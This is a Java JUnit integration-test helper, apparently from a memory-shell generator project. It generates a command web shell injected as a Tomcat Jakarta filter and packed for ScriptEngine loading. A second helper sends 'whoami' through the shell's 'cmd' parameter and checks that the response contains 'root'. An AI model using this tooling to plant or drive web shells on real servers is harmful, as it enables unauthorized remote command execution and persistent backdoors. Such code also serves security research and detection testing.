package com.reajason.javaweb.integration;

import com.reajason.javaweb.GeneratorMain;
import com.reajason.javaweb.config.CommandShellConfig;
import com.reajason.javaweb.config.GenerateResult;
import com.reajason.javaweb.config.Server;
import com.reajason.javaweb.config.ShellTool;
import com.reajason.javaweb.memsell.packer.Packer;
import com.reajason.javaweb.memsell.tomcat.TomcatShell;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.junit.jupiter.api.Test;

import java.util.Objects;

import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * @author ReaJason
 * @since 2024/11/30
 */
@Slf4j
public class CommandShellTool {

    @Test
    void testGenerate() {
        String content = generate(Server.TOMCAT, CommandShellConfig.builder().paramName("cmd").build(), TomcatShell.JAKARTA_FILTER, Opcodes.V11, Packer.INSTANCE.ScriptEngine);
        System.out.println(content);
    }

    public static String generate(Server server, CommandShellConfig config, String shellType, int targetJdkVersion, Packer.INSTANCE packer) {
        ShellTool shellTool = ShellTool.COMMAND;
        GenerateResult generateResult = GeneratorMain.generate(server, shellTool, shellType, config, targetJdkVersion);
        return new String(packer.getPacker().pack(generateResult));
    }

    @SneakyThrows
    public static void testIsOk(String entrypoint, CommandShellConfig shellConfig) {
        OkHttpClient okHttpClient = new OkHttpClient();
        HttpUrl url = Objects.requireNonNull(HttpUrl.parse(entrypoint))
                .newBuilder()
                .addQueryParameter(shellConfig.getParamName(), "whoami")
                .build();
        Request request = new Request.Builder()
                .url(url)
                .get().build();

        try (Response response = okHttpClient.newCall(request).execute()) {
            String res = response.body().string();
            assertTrue(res.contains("root"));
        }
    }
}
